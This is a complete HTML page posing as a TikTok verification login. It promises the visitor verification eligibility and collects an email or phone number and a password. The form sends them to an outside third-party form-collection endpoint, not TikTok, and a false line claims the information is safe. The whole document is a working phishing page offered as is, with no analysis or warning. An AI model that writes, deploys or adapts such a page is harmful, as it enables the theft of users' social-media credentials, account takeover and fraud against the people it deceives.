<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>TikTok verification</title>
  <style>
    body {
      background-color: #0f0f0f;
      color: white;
      font-family: 'Segoe UI', sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background-color: #1a1a1a;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
      text-align: center;
      width: 300px;
    }

    h1 {
      margin-bottom: 20px;
      font-size: 24px;
      color: #fff;
    }

    input, button {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-bottom: 15px;
      font-size: 16px;
    }

    input {
      background-color: #2a2a2a;
      color: white;
    }

    button {
      background-color: #ff0050;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #e00045;
    }

    small {
      display: block;
      margin-top: 10px;
      color: #aaa;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Congratulations, you are now eligible to apply to be verified</h1>
    <h2>Log in to get started</h2>
	<form action="https://formspree.io/f/mnqkjxyz" method="POST">
      <input type="text" name="name" placeholder="Email/Phone number" reqiured /> <input type="text"
	  name="password" placeholder="Password" required />
	  <button type="submit">send</button>
	  <small>Your information is safe and only used for this form.</small>
	  </form>
	  </div>
	  </body>
	  </html>
